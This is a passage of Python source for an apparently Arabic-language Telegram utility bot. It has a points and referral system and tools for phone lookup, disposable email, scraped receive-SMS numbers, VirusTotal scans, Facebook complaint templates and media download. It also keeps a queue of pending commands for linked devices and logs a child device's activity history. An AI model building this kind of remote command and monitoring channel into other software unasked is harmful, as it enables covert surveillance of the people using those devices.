# -*- coding: utf-8 -*-

"""
البوت النهائي - نظام ANONYMOUS_T11
الإصدار النهائي المتكامل - مع كل التعديلات والإصلاحات
"""

import os
import sys
import time
import json
import logging
import hashlib
import base64
import re
import secrets
import string
import shutil
import sqlite3
from datetime import datetime, timedelta
from contextlib import contextmanager
from io import BytesIO
import threading

import requests
import phonenumbers
from phonenumbers import geocoder, carrier
from flask import Flask, request, jsonify
from telebot import TeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
import pypdf
from bs4 import BeautifulSoup
import html
from dotenv import load_dotenv
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from PIL import Image

load_dotenv()

# ===================== إعدادات التسجيل =====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(), logging.FileHandler('bot.log')]
)
logger = logging.getLogger(__name__)

# ===================== متغيرات البيئة الأساسية =====================
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
if not TELEGRAM_TOKEN:
    logger.critical("❌ TELEGRAM_TOKEN غير مضبوط!")
    sys.exit(1)

ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))
if ADMIN_ID == 0:
    logger.critical("❌ ADMIN_ID غير مضبوط!")
    sys.exit(1)

ADMIN_KEY = os.environ.get('ADMIN_KEY', '')
SERVER_URL = os.environ.get('SERVER_URL', '')
VIRUSTOTAL_API_KEY = os.environ.get('VIRUSTOTAL_API_KEY', '')
SHODAN_API_KEY = os.environ.get('SHODAN_API_KEY', '')
VERIPHONE_API_KEY = os.environ.get('VERIPHONE_API_KEY', '')
GOOGLE_CLIENT_ID = os.environ.get('GOOGLE_CLIENT_ID', '')
GOOGLE_CLIENT_SECRET = os.environ.get('GOOGLE_CLIENT_SECRET', '')
GEMINI_API_KEY = os.environ.get('GEMINI_API_KEY', '')
PORT = int(os.environ.get('PORT', 5000))
CLIENT_SECRET_KEY = os.environ.get('CLIENT_SECRET_KEY', 'default_secret_key_please_change')
if CLIENT_SECRET_KEY == 'default_secret_key_please_change':
    logger.warning("⚠️ CLIENT_SECRET_KEY هي القيمة الافتراضية! يُرجى تغييرها.")
USE_WEBHOOK = os.environ.get('USE_WEBHOOK', 'false').lower() == 'true'

# ===================== مسار قاعدة البيانات =====================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, 'data')
DB_PATH = os.path.join(DATA_DIR, 'bot_data.db')
os.makedirs(DATA_DIR, exist_ok=True)
TEMP_DIR = os.path.join(BASE_DIR, 'temp')
os.makedirs(TEMP_DIR, exist_ok=True)

# ===================== التحقق من FFmpeg =====================
FFMPEG_AVAILABLE = shutil.which('ffmpeg') is not None
if not FFMPEG_AVAILABLE:
    logger.warning("⚠️ FFmpeg غير مثبت! بعض الميزات لن تعمل.")

# ===================== جلسة Requests مع Retry =====================
def get_requests_session(retries=3, backoff_factor=1.0):
    session = requests.Session()
    retry_strategy = Retry(
        total=retries,
        backoff_factor=backoff_factor,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

REQUEST_SESSION = get_requests_session()

# ===================== إنشاء البوت والتطبيق =====================
bot = TeleBot(TELEGRAM_TOKEN, parse_mode=None)
app = Flask(__name__)

# ===================== دالة الإرسال الآمنة =====================
def safe_send(chat_id, text, reply_markup=None):
    try:
        return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode=None)
    except Exception as e:
        logger.error(f"safe_send error: {e}")
        return None

# ===================== قاعدة البيانات =====================
def get_db_connection():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            chat_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            registered_at TEXT,
            points INTEGER DEFAULT 10,
            referral_code TEXT UNIQUE,
            referred_by INTEGER,
            is_banned INTEGER DEFAULT 0
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS devices (
            device_id TEXT PRIMARY KEY,
            chat_id INTEGER,
            type TEXT,
            real_id TEXT,
            endpoint TEXT,
            linked_at TEXT,
            last_seen TEXT,
            blocked_domains TEXT,
            history TEXT,
            FOREIGN KEY (chat_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS registered_devices (
            device_id TEXT PRIMARY KEY,
            chat_id INTEGER,
            last_seen TEXT,
            registered_at TEXT,
            FOREIGN KEY (chat_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS pending_commands (
            device_id TEXT,
            command TEXT,
            created_at TEXT,
            executed INTEGER DEFAULT 0,
            PRIMARY KEY (device_id, created_at)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS referrals (
            code TEXT PRIMARY KEY,
            owner_id INTEGER,
            used_by INTEGER,
            used_at TEXT,
            FOREIGN KEY (owner_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS points_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount INTEGER,
            reason TEXT,
            created_at TEXT,
            FOREIGN KEY (user_id) REFERENCES users (chat_id)
        )''')
        c.execute("CREATE INDEX IF NOT EXISTS idx_users_chat_id ON users (chat_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_devices_chat_id ON devices (chat_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_registered_devices_chat_id ON registered_devices (chat_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_pending_commands_device_id ON pending_commands (device_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_pending_commands_executed ON pending_commands (executed)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_referrals_code ON referrals (code)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_points_log_user_id ON points_log (user_id)")
        conn.commit()
        logger.info(f"✅ قاعدة البيانات جاهزة: {DB_PATH}")

init_db()

# ===================== دوال قاعدة البيانات =====================
@contextmanager
def db_transaction():
    conn = get_db_connection()
    try:
        yield conn
        conn.commit()
    except Exception as e:
        conn.rollback()
        raise e
    finally:
        conn.close()

def get_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE chat_id = ?", (chat_id,))
        return c.fetchone()

def upsert_user(chat_id, username=None, first_name=None, last_name=None, referral_code=None, referred_by=None):
    with db_transaction() as conn:
        c = conn.cursor()
        existing = get_user(chat_id)
        if existing:
            c.execute('''UPDATE users SET username=?, first_name=?, last_name=? WHERE chat_id=?''',
                      (username, first_name, last_name, chat_id))
        else:
            c.execute('''INSERT INTO users (chat_id, username, first_name, last_name, registered_at, points, referral_code, referred_by)
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                      (chat_id, username, first_name, last_name, datetime.now().isoformat(), 10, referral_code, referred_by))
        conn.commit()

def get_user_points(chat_id):
    user = get_user(chat_id)
    return user['points'] if user else 0

def deduct_points(chat_id, amount, reason):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT points FROM users WHERE chat_id = ?", (chat_id,))
        row = c.fetchone()
        if not row or row['points'] < amount:
            return False
        c.execute("UPDATE users SET points = points - ? WHERE chat_id = ?", (amount, chat_id))
        c.execute('''INSERT INTO points_log (user_id, amount, reason, created_at)
                     VALUES (?, ?, ?, ?)''',
                  (chat_id, -amount, reason, datetime.now().isoformat()))
        conn.commit()
        return True

def add_points_db(chat_id, amount, reason):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET points = points + ? WHERE chat_id = ?", (amount, chat_id))
        c.execute('''INSERT INTO points_log (user_id, amount, reason, created_at)
                     VALUES (?, ?, ?, ?)''',
                  (chat_id, amount, reason, datetime.now().isoformat()))
        conn.commit()

def get_points_history(chat_id, limit=20):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''SELECT amount, reason, created_at FROM points_log 
                     WHERE user_id = ? ORDER BY created_at DESC LIMIT ?''',
                  (chat_id, limit))
        return c.fetchall()

def is_user_banned(chat_id):
    user = get_user(chat_id)
    return user and user['is_banned'] == 1

def ban_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET is_banned = 1 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def unban_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET is_banned = 0 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def get_registered_devices_db():
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM registered_devices")
        return c.fetchall()

def save_registered_device_db(device_id, chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO registered_devices 
                     (device_id, chat_id, last_seen, registered_at)
                     VALUES (?, ?, ?, ?)''',
                  (device_id, chat_id, datetime.now().isoformat(), datetime.now().isoformat()))
        conn.commit()

def update_registered_device_seen_db(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE registered_devices SET last_seen = ? WHERE device_id = ?", 
                  (datetime.now().isoformat(), device_id))
        conn.commit()

def add_pending_command_db(device_id, command):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''INSERT INTO pending_commands (device_id, command, created_at, executed)
                     VALUES (?, ?, ?, 0)''',
                  (device_id, command, datetime.now().isoformat()))
        conn.commit()

def get_pending_command_db(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM pending_commands WHERE device_id = ? AND executed = 0 ORDER BY created_at LIMIT 1", (device_id,))
        row = c.fetchone()
        if row:
            c.execute("UPDATE pending_commands SET executed = 1 WHERE device_id = ? AND created_at = ?",
                      (device_id, row['created_at']))
            conn.commit()
            return row['command']
        return None

def save_device(device_id, chat_id, device_type, real_id, endpoint, blocked_domains='[]', history='[]'):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO devices 
                     (device_id, chat_id, type, real_id, endpoint, linked_at, last_seen, blocked_domains, history)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                  (device_id, chat_id, device_type, real_id, endpoint, datetime.now().isoformat(),
                   datetime.now().isoformat(), blocked_domains, history))
        conn.commit()

def get_device(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
        return c.fetchone()

def get_devices_by_chat(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices WHERE chat_id = ?", (chat_id,))
        return c.fetchall()

def get_blocked_domains(chat_id):
    devices = get_devices_by_chat(chat_id)
    if not devices:
        return []
    blocked = []
    for dev in devices:
        if dev['blocked_domains']:
            try:
                blocked.extend(json.loads(dev['blocked_domains']))
            except:
                pass
    return list(set(blocked))

def log_child_activity(chat_id, activity):
    devices = get_devices_by_chat(chat_id)
    if not devices:
        return
    for dev in devices:
        if dev['type'] and 'طفل' in dev['type']:
            history = []
            if dev['history']:
                try:
                    history = json.loads(dev['history'])
                except:
                    history = []
            history.append({'time': datetime.now().isoformat(), 'activity': activity})
            if len(history) > 100:
                history = history[-100:]
            with db_transaction() as conn:
                c = conn.cursor()
                c.execute("UPDATE devices SET history = ? WHERE device_id = ?", 
                          (json.dumps(history), dev['device_id']))
                conn.commit()
            break

# ===================== دوال الإحالات =====================
def generate_referral_code():
    return ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(6))

def create_referral_link(user_id):
    code = generate_referral_code()
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO referrals (code, owner_id) VALUES (?, ?)", (code, user_id))
        conn.commit()
    return f"https://t.me/{(bot.get_me()).username}?start=ref_{code}"

def handle_referral(code, new_user_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT owner_id FROM referrals WHERE code = ? AND used_by IS NULL", (code,))
        row = c.fetchone()
        if not row:
            return False
        referrer_id = row['owner_id']
        if referrer_id == new_user_id:
            return False
        c.execute("UPDATE referrals SET used_by = ?, used_at = ? WHERE code = ?",
                  (new_user_id, datetime.now().isoformat(), code))
        add_points_db(referrer_id, 10, "دعوة مستخدم جديد")
        add_points_db(new_user_id, 10, "مكافأة التسجيل عبر الدعوة")
        safe_send(referrer_id, "🎉 تم تسجيل مستخدم جديد عبر رابط دعوتك! +10 نقاط.")
        return True

# ===================== دوال الخدمات (المحسّنة) =====================

# 1. المساعد الذكي (مع مصادر متعددة)
def get_ai_response(prompt):
    """الحصول على رد من عدة مصادر مجانية مع ترتيب احتياطي"""
    # المصدر 1: Popcat API
    try:
        url = f"https://api.popcat.xyz/chat?msg={requests.utils.quote(prompt)}"
        response = REQUEST_SESSION.get(url, timeout=15)
        if response.status_code == 200:
            data = response.json()
            if data and 'response' in data:
                return data['response']
    except Exception as e:
        logger.error(f"Popcat API error: {e}")
    
    # المصدر 2: Some Random API
    try:
        alt_url = f"https://some-random-api.com/chatbot/response?message={requests.utils.quote(prompt)}"
        alt_response = REQUEST_SESSION.get(alt_url, timeout=15)
        if alt_response.status_code == 200:
            alt_data = alt_response.json()
            if alt_data and 'response' in alt_data:
                return alt_data['response']
    except Exception as e:
        logger.error(f"Some Random API error: {e}")
    
    # المصدر 3: Gemini API (إذا كان المفتاح متاحاً)
    if GEMINI_API_KEY:
        try:
            import google.generativeai as genai
            genai.configure(api_key=GEMINI_API_KEY)
            model = genai.GenerativeModel('gemini-pro')
            response = model.generate_content(prompt)
            if response.text:
                return response.text
        except Exception as e:
            logger.error(f"Gemini API error: {e}")
    
    return "🤖 عذراً، جميع محاولات الاتصال بخدمات الذكاء الاصطناعي قد فشلت في الوقت الحالي. يُرجى المحاولة مرة أخرى لاحقاً."

# 2. توليد الصور (محسّن بشكل كبير)
def generate_and_send_image(chat_id, description):
    """توليد صورة باستخدام Pollinations مع معالجة متقدمة"""
    temp_image_path = os.path.join(TEMP_DIR, f"image_{int(time.time())}.jpg")
    try:
        # محاولة 1: Pollinations AI
        url = f"https://pollinations.ai/p/{description.replace(' ', '%20')}?width=1024&height=1024&nologo=true&seed={int(time.time())}"
        logger.info(f"محاولة توليد صورة من: {url}")
        response = REQUEST_SESSION.get(url, timeout=60)
        
        if response.status_code != 200 or not response.content:
            logger.warning(f"Pollinations فشل: كود {response.status_code}")
            # محاولة 2: خدمة بديلة
            url2 = f"https://image.pollinations.ai/prompt/{description.replace(' ', '%20')}?width=1024&height=1024"
            response = REQUEST_SESSION.get(url2, timeout=60)
            if response.status_code != 200 or not response.content:
                safe_send(chat_id, "⚠️ عذراً، تعذر إنشاء الصورة المطلوبة. يُرجى المحاولة مرة أخرى.")
                return False
        
        # حفظ الصورة مؤقتاً
        with open(temp_image_path, 'wb') as f:
            f.write(response.content)
        
        # التحقق من صحة الصورة باستخدام Pillow
        try:
            img = Image.open(temp_image_path)
            img.verify()
            img.close()
        except Exception as e:
            logger.error(f"Pillow validation error: {e}")
            safe_send(chat_id, "⚠️ فشل التحقق من الصورة المُولَّدة. يُرجى المحاولة مرة أخرى.")
            os.remove(temp_image_path) if os.path.exists(temp_image_path) else None
            return False
        
        # إرسال الصورة
        with open(temp_image_path, 'rb') as f:
            bot.send_photo(chat_id, f, caption="🖼️ الصورة المُولَّدة بنجاح")
        
        # حذف الملف المؤقت
        os.remove(temp_image_path) if os.path.exists(temp_image_path) else None
        return True
        
    except Exception as e:
        logger.error(f"generate_and_send_image error: {e}")
        safe_send(chat_id, f"⚠️ حدث عطل فني أثناء إنشاء الصورة: {str(e)[:100]}")
        os.remove(temp_image_path) if os.path.exists(temp_image_path) else None
        return False

# 3. فحص الموقع
def scan_website(url):
    url = url.strip()
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        response = REQUEST_SESSION.get(url, timeout=15, allow_redirects=True)
        if response.status_code == 200:
            try:
                soup = BeautifulSoup(response.text, 'html.parser')
                title = soup.title.string.strip() if soup.title else "لا يوجد عنوان"
                desc = soup.find('meta', {'name': 'description'})
                description = desc.get('content', '').strip()[:100] if desc else ""
                result = (
                    f"✅ الموقع يعمل!\n"
                    f"📌 الحالة: {response.status_code} (متاح)\n"
                    f"📝 العنوان: {title}\n"
                    f"📖 الوصف: {description}\n"
                    f"🔗 الرابط: {url}"
                )
                return result, "safe"
            except:
                return f"✅ الموقع يعمل!\n📌 الحالة: {response.status_code}\n🔗 الرابط: {url}", "safe"
        else:
            return f"⚠️ الموقع غير متاح حالياً (Status {response.status_code})", "error"
    except Exception as e:
        return f"❌ فشل الاتصال بالموقع: {str(e)}", "error"

# 4. تتبع الأرقام
def track_phone_real(phone):
    try:
        parsed = phonenumbers.parse(phone, None)
        country = geocoder.country_name_for_number(parsed, "ar")
        carrier_name = carrier.name_for_number(parsed, "ar")
        region = geocoder.description_for_number(parsed, "ar")
        return (f"📍 الرقم: {phone}\n"
                f"🌍 البلد: {country}\n"
                f"📍 المنطقة: {region}\n"
                f"📡 المشغل: {carrier_name}", "valid")
    except Exception as e:
        return f"❌ رقم غير صحيح: {str(e)}", "invalid"

# 5. البريد المؤقت
def create_temp_email_real():
    try:
        domain_resp = REQUEST_SESSION.get("https://api.mail.tm/domains", timeout=10)
        if domain_resp.status_code != 200:
            return None, None, None
        domains = domain_resp.json()
        domain = domains['hydra:member'][0]['domain'] if domains.get('hydra:member') else 'mail.tm'
        username = ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(10))
        email = f"{username}@{domain}"
        password = ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(12))
        register = REQUEST_SESSION.post("https://api.mail.tm/accounts", 
                                       json={"address": email, "password": password}, timeout=10)
        if register.status_code != 201:
            return None, None, None
        login = REQUEST_SESSION.post("https://api.mail.tm/token", 
                                    json={"address": email, "password": password}, timeout=10)
        if login.status_code != 200:
            return None, None, None
        token = login.json().get('token')
        return email, token, password
    except Exception as e:
        return None, None, None

def check_temp_emails_real(token):
    if not token:
        return []
    try:
        headers = {"Authorization": f"Bearer {token}"}
        response = REQUEST_SESSION.get("https://api.mail.tm/messages", headers=headers, timeout=10)
        if response.status_code == 200:
            messages = response.json().get('hydra:member', [])
            results = []
            for msg in messages[:5]:
                results.append(f"📩 من: {msg.get('from', {}).get('address', '')}\n📌 الموضوع: {msg.get('subject', '')}\n📝 مقتطف: {msg.get('intro', '')[:150]}...")
            return results
    except:
        pass
    return []

# 6. فحص APK
def scan_apk_real(file_content, file_name):
    if not VIRUSTOTAL_API_KEY:
        return "⚠️ مفتاح VirusTotal غير مضبوط. يرجى إضافة VIRUSTOTAL_API_KEY", "error"
    try:
        url = "https://www.virustotal.com/api/v3/files"
        headers = {"x-apikey": VIRUSTOTAL_API_KEY}
        files = {'file': (file_name, file_content)}
        response = REQUEST_SESSION.post(url, headers=headers, files=files, timeout=60)
        if response.status_code == 200:
            scan_id = response.json().get('data', {}).get('id')
            if scan_id:
                time.sleep(5)
                report_url = f"https://www.virustotal.com/api/v3/analyses/{scan_id}"
                report = REQUEST_SESSION.get(report_url, headers=headers, timeout=30)
                if report.status_code == 200:
                    stats = report.json().get('data', {}).get('attributes', {}).get('stats', {})
                    malicious = stats.get('malicious', 0)
                    suspicious = stats.get('suspicious', 0)
                    if malicious > 0:
                        return f"🚨 تم اكتشاف {malicious} تهديدات!", "malicious"
                    elif suspicious > 0:
                        return f"⚠️ تم اكتشاف {suspicious} عناصر مشبوهة.", "suspicious"
                    else:
                        return "✅ الملف آمن.", "safe"
        return "⚠️ فشل فحص الملف.", "error"
    except Exception as e:
        return f"⚠️ خطأ: {str(e)}", "error"

# 7. توليد بلاغ فيسبوك (مع نماذج جاهزة)
def generate_fb_report(report_type, reason, link):
    # محاولة استخدام الذكاء الاصطناعي أولاً
    prompt = f"""اكتب شكوى رسمية لفيسبوك باللغة الإنجليزية:

النوع: {report_type}
السبب: {reason}
الرابط (إن وجد): {link}

اكتبها بشكل احترافي وواضح."""
    ai_response = get_ai_response(prompt)
    # إذا كان الرد يحتوي على رسالة خطأ، استخدم النماذج الجاهزة
    if "عذراً" in ai_response or "فشلت" in ai_response:
        return fallback_complaint(report_type, reason, link)
    return ai_response

def fallback_complaint(report_type, reason, link):
    """نماذج شكاوى جاهزة ومهنية"""
    templates = {
        "📢 منشور مسيء": f"""Dear Facebook Support Team,

I am writing to formally report a post that violates Facebook's Community Standards regarding Hate Speech and Offensive Content.

The post contains content that is highly offensive and violates Facebook's policies. I kindly request that you review this content and take appropriate action.

Link (if available): {link if link else 'Not provided'}

Description of the issue:
{reason}

Thank you for your attention to this matter.

Sincerely,
A concerned Facebook user""",
        "👤 حساب مزيف": f"""Dear Facebook Support Team,

I am writing to report a fake account that is impersonating me or someone I know. This account is using my personal information and photos without my consent.

Account Link: {link if link else 'Not provided'}

Details:
{reason}

I request that you investigate this account and take action to remove it as it violates Facebook's policies against impersonation.

Thank you for your help.

Sincerely,
A concerned Facebook user""",
        "🔒 انتهاك خصوصية": f"""Dear Facebook Support Team,

I am writing to report a privacy violation on Facebook. My personal information or content has been shared without my consent.

Link: {link if link else 'Not provided'}

Description:
{reason}

I request that you review this issue and take appropriate action to protect my privacy.

Thank you.

Sincerely,
A concerned Facebook user""",
        "⚠️ تحرش أو مضايقة": f"""Dear Facebook Support Team,

I am reporting a case of harassment or bullying on Facebook. The following content or account is causing me distress.

Link: {link if link else 'Not provided'}

Details:
{reason}

I urge you to investigate this matter and take immediate action.

Thank you.

Sincerely,
A concerned Facebook user""",
        "🎭 انتحال شخصية": f"""Dear Facebook Support Team,

I am reporting an account that is impersonating me or a public figure. This is a clear violation of Facebook's policies.

Link: {link if link else 'Not provided'}

Additional Information:
{reason}

Please take action to remove this impersonating account.

Thank you.

Sincerely,
A concerned Facebook user""",
        "💢 محتوى عنيف": f"""Dear Facebook Support Team,

I am reporting content that contains violence or promotes violent behavior. This content violates Facebook's Community Standards.

Link: {link if link else 'Not provided'}

Description:
{reason}

I request immediate review and action.

Thank you.

Sincerely,
A concerned Facebook user"""
    }
    # استخدام النموذج المناسب أو النموذج العام
    for key in templates:
        if key in report_type:
            return templates[key]
    # نموذج عام
    return f"""Dear Facebook Support Team,

I am writing to report content that violates Facebook's Community Standards regarding {report_type}.

Issue Description:
{reason}

Link: {link if link else 'Not provided'}

I kindly request that you review this matter and take appropriate action.

Thank you for your attention.

Sincerely,
A concerned Facebook user"""

# 8. استخراج PDF
def extract_text_from_pdf(pdf_content):
    try:
        from io import BytesIO
        pdf_file = BytesIO(pdf_content)
        reader = pypdf.PdfReader(pdf_file)
        text = ""
        for page in reader.pages:
            page_text = page.extract_text()
            if page_text:
                text += page_text + "\n"
        return text.strip()
    except Exception as e:
        return None

def split_text_into_chunks(text, max_chunk_size=3000):
    chunks = []
    while len(text) > max_chunk_size:
        split_point = text.rfind(' ', 0, max_chunk_size)
        if split_point == -1:
            split_point = max_chunk_size
        chunks.append(text[:split_point])
        text = text[split_point:].strip()
    if text:
        chunks.append(text)
    return chunks

def find_relevant_chunk(text, question, chunks):
    keywords = re.findall(r'\b\w+\b', question.lower())
    best_chunk = None
    best_score = 0
    for chunk in chunks:
        chunk_lower = chunk.lower()
        score = sum(1 for kw in keywords if kw in chunk_lower)
        if score > best_score:
            best_score = score
            best_chunk = chunk
    if best_chunk is None:
        best_chunk = chunks[0] if chunks else text
    return best_chunk

def answer_question_from_pdf(text, question):
    if not text:
        return "⚠️ لم يتم تحميل أي نص."
    chunks = split_text_into_chunks(text, 3000)
    relevant_chunk = find_relevant_chunk(text, question, chunks)
    prompt = f"بناءً على النص التالي، أجب على السؤال:\n\nالنص:\n{relevant_chunk}\n\nالسؤال: {question}"
    return get_ai_response(prompt)

# 9. أرقام مؤقتة
def fetch_temp_numbers_advanced(country_code='US', limit=5):
    results = []
    sources = [
        ("https://receive-sms-online.cc/", "US"),
        ("https://www.temporary-phone-number.com/", "US"),
        ("https://www.textnow.com/", "US"),
        ("https://sms-online.co/receive-free-sms/", "US"),
        ("https://www.freeonlinephone.org/", "US")
    ]
    for base_url, default_country in sources:
        try:
            response = REQUEST_SESSION.get(base_url, timeout=15)
            if response.status_code != 200:
                continue
            soup = BeautifulSoup(response.text, 'html.parser')
            text = soup.get_text()
            pattern = r'\+?\d{1,3}[-.\s]?\(?\d{1,4}\)?[-.\s]?\d{1,4}[-.\s]?\d{1,4}'
            matches = re.findall(pattern, text)
            for match in matches[:limit]:
                cleaned = re.sub(r'[-.\s()]', '', match)
                if not cleaned.startswith('+'):
                    cleaned = '+' + cleaned
                country = default_country
                country_names = ['USA', 'UK', 'Canada', 'Germany', 'France', 'Spain', 'Italy', 'Egypt', 'UAE', 'Saudi']
                for name in country_names:
                    if name in text[max(0, text.find(match)-50):text.find(match)+50]:
                        country = name
                        break
                results.append({
                    'number': cleaned,
                    'country': country,
                    'source': base_url,
                    'status': 'available'
                })
                if len(results) >= limit:
                    break
            if len(results) >= limit:
                break
        except Exception as e:
            continue
    return results

# ===================== دوال TTS مع أصوات مختلفة =====================
VOICE_MAP = {
    "female": {
        "name": "👩 صوت أنثوي",
        "gtts_lang": "ar",
        "gtts_tld": "com",
        "edge_voice": "ar-SA-ZariNeural"
    },
    "male": {
        "name": "👨 صوت ذكوري",
        "gtts_lang": "ar",
        "gtts_tld": "co.uk",
        "edge_voice": "ar-SA-HamedNeural"
    },
    "child": {
        "name": "🧒 صوت طفولي",
        "gtts_lang": "ar",
        "gtts_tld": "co.za",
        "edge_voice": "ar-EG-ShakirNeural"
    },
    "scary": {
        "name": "👻 صوت مخيف",
        "gtts_lang": "ar",
        "gtts_tld": "com.au",
        "edge_voice": "ar-AE-FatimaNeural"
    }
}

def build_voice_selection_markup():
    markup = InlineKeyboardMarkup(row_width=2)
    for key, val in VOICE_MAP.items():
        markup.row(InlineKeyboardButton(val["name"], callback_data=f"voice_{key}"))
    markup.row(InlineKeyboardButton("❌ إلغاء", callback_data="back_to_main"))
    return markup

def clean_text_for_tts(text):
    text = re.sub(r'http\S+', '', text)
    text = re.sub(r'[^\w\s.,!؟]', '', text)
    text = re.sub(r'\s+', ' ', text).strip()
    return text

def text_to_speech(text, voice_key='female'):
    if not FFMPEG_AVAILABLE:
        return None, "⚠️ FFmpeg غير مثبت على النظام. يُرجى تثبيته لتشغيل هذه الميزة."
    clean_text = clean_text_for_tts(text)
    if not clean_text:
        return None, "⚠️ النص فارغ بعد التنظيف."
    voice = VOICE_MAP.get(voice_key, VOICE_MAP['female'])
    temp_file = os.path.join(TEMP_DIR, f"tts_{int(time.time())}.mp3")
    try:
        import edge_tts
        import asyncio
        async def _tts():
            communicate = edge_tts.Communicate(clean_text, voice=voice["edge_voice"])
            await communicate.save(temp_file)
        asyncio.run(_tts())
        if os.path.exists(temp_file) and os.path.getsize(temp_file) > 0:
            return temp_file, None
    except Exception as e:
        logger.error(f"edge-tts error: {e}")
        if os.path.exists(temp_file):
            os.remove(temp_file)
    try:
        from gtts import gTTS
        tts = gTTS(text=clean_text, lang=voice["gtts_lang"], tld=voice["gtts_tld"], slow=False)
        tts.save(temp_file)
        if os.path.exists(temp_file) and os.path.getsize(temp_file) > 0:
            return temp_file, None
    except Exception as e:
        logger.error(f"gTTS error: {e}")
        return None, f"⚠️ فشل تحويل النص إلى صوت: {str(e)[:100]}"

# ===================== دوال تحميل الفيديو =====================
def download_video(url):
    if not FFMPEG_AVAILABLE:
        return None, "⚠️ FFmpeg غير مثبت على النظام. يُرجى تثبيته لتشغيل هذه الميزة."
    try:
        import yt_dlp
        output_template = os.path.join(TEMP_DIR, f"video_{int(time.time())}.%(ext)s")
        ydl_opts = {
            'outtmpl': output_template,
            'format': 'bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best',
            'quiet': True,
            'no_warnings': True,
        }
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            downloaded_file = ydl.prepare_filename(info)
            if os.path.exists(downloaded_file) and os.path.getsize(downloaded_file) > 0:
                return downloaded_file, None
            else:
                return None, "⚠️ فشل تحميل الفيديو: الملف فارغ أو تالف."
    except Exception as e:
        logger.error(f"Download video error: {e}")
        return None, f"⚠️ فشل تحميل الفيديو: {str(e)[:100]}"

# ===================== دوال تقصير الروابط =====================
def shorten_url(url):
    try:
        response = REQUEST_SESSION.get(f"https://is.gd/create.php?format=json&url={requests.utils.quote(url)}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            if 'shorturl' in data:
                return data['shorturl'], None
            else:
                return None, data.get('errormessage', 'خطأ غير معروف')
        else:
            return None, f"فشل الاتصال (كود {response.status_code})"
    except Exception as e:
        return None, f"خطأ: {str(e)}"

# ===================== 🛡️ دوال فحص الثغرات (باستخدام أدوات مجانية) =====================
def check_domain_virustotal(domain):
    """فحص نطاق باستخدام VirusTotal (إذا كان المفتاح متاحاً)"""
    if VIRUSTOTAL_API_KEY:
        try:
            url = f"https://www.virustotal.com/api/v3/domains/{domain}"
            headers = {"x-apikey": VIRUSTOTAL_API_KEY}
            response = REQUEST_SESSION.get(url, headers=headers, timeout=30)
            if response.status_code == 200:
                data = response.json()
                stats = data.get('data', {}).get('attributes', {}).get('last_analysis_stats', {})
                malicious = stats.get('malicious', 0)
                suspicious = stats.get('suspicious', 0)
                result = f"🌐 تحليل النطاق: {domain}\n"
                result += f"🛡️ نتائج الفحص:\n"
                result += f"   - ضار: {malicious}\n"
